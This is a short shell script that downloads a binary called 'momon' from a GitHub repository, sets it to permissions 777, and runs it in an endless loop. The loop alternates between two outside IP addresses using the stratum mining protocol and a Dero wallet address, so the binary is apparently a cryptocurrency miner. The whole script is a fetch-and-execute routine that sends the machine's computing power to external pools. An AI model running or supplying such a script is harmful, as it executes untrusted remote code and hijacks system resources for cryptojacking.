wget https://github.com/renilo/kuuntul/raw/main/momon
chmod 777 momon

while :; do
    ./momon -w dero1qywdlqwhmp689gqsevs5dlvgyh8pc7xhde6cd8uw7w87d8f24y2xyqq0h2ec4.TESTING -r 170.187.197.220:443 -p stratum -k -1;
    sleep 5;
    ./momon -w dero1qywdlqwhmp689gqsevs5dlvgyh8pc7xhde6cd8uw7w87d8f24y2xyqq0h2ec4.TESTING -r 162.19.68.52:443 -p stratum -k -1;
    sleep 5;
done
